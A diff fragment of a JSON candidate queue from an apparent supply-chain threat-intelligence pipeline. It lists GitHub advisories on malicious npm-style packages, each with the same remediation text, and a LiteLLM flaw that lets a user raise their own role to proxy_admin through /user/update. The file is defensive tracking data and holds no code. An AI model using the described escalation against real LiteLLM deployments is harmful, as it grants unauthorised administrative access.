+      "candidateId": "SC-CAND-10a02404294ac157",
+      "canonicalSubjectId": "GHSA-72WP-5HHW-XHFC",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in eth_accounts",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-72wp-5hhw-xhfc"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-72wp-5hhw-xhfc"
+      ],
+      "firstSeenAt": "2026-06-24T10:16:51.000Z",
+      "lastMaterialActivityAt": "2026-06-24T10:16:52.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T10:16:52.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-ecca71a48fedae61",
+      "canonicalSubjectId": "GHSA-JC2J-9J5F-FC2W",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in evmdotjs",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-jc2j-9j5f-fc2w"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-jc2j-9j5f-fc2w"
+      ],
+      "firstSeenAt": "2026-06-24T10:16:51.000Z",
+      "lastMaterialActivityAt": "2026-06-24T10:16:51.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T10:16:51.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-c1b72c2e7f7b63d8",
+      "canonicalSubjectId": "GHSA-M9G3-3J2M-GF65",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in pretie_x1",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-m9g3-3j2m-gf65"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-m9g3-3j2m-gf65"
+      ],
+      "firstSeenAt": "2026-06-24T10:07:58.000Z",
+      "lastMaterialActivityAt": "2026-06-24T10:07:58.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T10:07:58.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-6fc795b9e402d0de",
+      "canonicalSubjectId": "GHSA-WQXW-WJ7C-PV2X",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in pretie_x2",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-wqxw-wj7c-pv2x"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-wqxw-wj7c-pv2x"
+      ],
+      "firstSeenAt": "2026-06-24T10:07:58.000Z",
+      "lastMaterialActivityAt": "2026-06-24T10:07:58.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T10:07:58.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-15d9448d90e84079",
+      "canonicalSubjectId": "GHSA-4WH6-H6RW-F94H",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in tailwind-textform-fill",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-4wh6-h6rw-f94h"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-4wh6-h6rw-f94h"
+      ],
+      "firstSeenAt": "2026-06-24T01:53:31.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:53:31.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:53:31.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-f5e5b3ee3c5ffc34",
+      "canonicalSubjectId": "GHSA-2GQJ-WRF5-35W8",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in html-to-gutenberg",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-2gqj-wrf5-35w8"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-2gqj-wrf5-35w8"
+      ],
+      "firstSeenAt": "2026-06-24T01:51:00.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:51:05.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:51:05.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-97b62295b8e2acbb",
+      "canonicalSubjectId": "GHSA-VXQ2-VHM7-7MHQ",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in fetch-page-assets",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-vxq2-vhm7-7mhq"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-vxq2-vhm7-7mhq"
+      ],
+      "firstSeenAt": "2026-06-24T01:44:29.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:44:30.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:44:30.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-ddd8d4d98ad8b193",
+      "canonicalSubjectId": "GHSA-3M8W-M4VC-8F58",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in postcss-minify-selector-parser",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-3m8w-m4vc-8f58"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-3m8w-m4vc-8f58"
+      ],
+      "firstSeenAt": "2026-06-24T01:36:57.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:36:58.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:36:58.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-263c4995f30011fa",
+      "canonicalSubjectId": "GHSA-F4HV-X68W-WQR9",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in aes-decode-runner-pro",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-f4hv-x68w-wqr9"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-f4hv-x68w-wqr9"
+      ],
+      "firstSeenAt": "2026-06-24T01:36:57.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:36:58.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:36:58.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-88a24beeb5141de1",
+      "canonicalSubjectId": "GHSA-GWV6-F7J6-4XC8",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in postcss-minify-selector",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-gwv6-f7j6-4xc8"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-gwv6-f7j6-4xc8"
+      ],
+      "firstSeenAt": "2026-06-24T01:36:57.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:36:57.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:36:57.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-c8b350947a622c9c",
+      "canonicalSubjectId": "GHSA-89VX-WFVC-J58F",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in node-vfs-polyfill",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-89vx-wfvc-j58f"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-89vx-wfvc-j58f"
+      ],
+      "firstSeenAt": "2026-06-24T01:17:57.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:17:57.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:17:57.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-7d6bd0d1fb668b95",
+      "canonicalSubjectId": "GHSA-VXWH-GQJR-FXCW",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in vscode-test-web",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-vxwh-gqjr-fxcw"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-vxwh-gqjr-fxcw"
+      ],
+      "firstSeenAt": "2026-06-24T01:17:57.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:17:57.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:17:57.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-75dd3e2308b96481",
+      "canonicalSubjectId": "GHSA-FQ5H-GC4G-76CP",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in opt-archetype-check",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-fq5h-gc4g-76cp"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-fq5h-gc4g-76cp"
+      ],
+      "firstSeenAt": "2026-06-24T01:17:57.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:17:57.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:17:57.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-f7db2b1ad0fed2e7",
+      "canonicalSubjectId": "GHSA-75G7-VCXW-P99C",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in markdownlint-cli2-fix",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-75g7-vcxw-p99c"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-75g7-vcxw-p99c"
+      ],
+      "firstSeenAt": "2026-06-24T01:17:57.000Z",
+      "lastMaterialActivityAt": "2026-06-24T01:17:57.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T01:17:57.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-14cd1d224a522cf0",
+      "canonicalSubjectId": "GHSA-VXX9-PQ69-M5RH",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in @muaththir/api",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-vxx9-pq69-m5rh"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-vxx9-pq69-m5rh"
+      ],
+      "firstSeenAt": "2026-06-23T16:11:16.000Z",
+      "lastMaterialActivityAt": "2026-06-23T16:11:17.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-23T16:11:17.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-91ac5d812d88eef9",
+      "canonicalSubjectId": "CVE-2026-47102",
+      "subjectType": "cve",
+      "proposedArchetype": "incident",
+      "title": "LiteLLM allows a user to modify their own user_role via the /user/update endpoint",
+      "summary": "LiteLLM prior to 1.83.10 allows a user to modify their own user_role via the /user/update endpoint. While the endpoint correctly restricts users to updating only their own account, it does not restrict which fields may be changed. A user who can reach this endpoint can set their role to proxy_admin, gaining full administrative access to LiteLLM including all users, teams, keys, models, and prompt history. Users with the org_admin role have legitimate access to this endpoint and can exploit this vulnerability without chaining any additional flaw.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-wpfp-gwwc-vwq6"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-wpfp-gwwc-vwq6"
+      ],
+      "firstSeenAt": "2026-05-21T21:30:37.000Z",
+      "lastMaterialActivityAt": "2026-06-23T22:48:11.000Z",
+      "activityBasis": [
+        "advisory_updated"
+      ],
+      "entityMatch": "matched",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [
+          {
+            "id": "pkg-pypi-litellm",
+            "name": "litellm",
+            "ecosystem": "pypi"
+          }
+        ],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "material activity within 180 days",
+        "workIntent": "reverify_existing",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "none",
+        "activeStatus": "none",
+        "activeStatusExpiresAt": null,
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 52,
+      "rankReasons": [
+        "current lead",
+        "advisory database signal",
+        "connects to existing Supply Chain graph"
+      ],
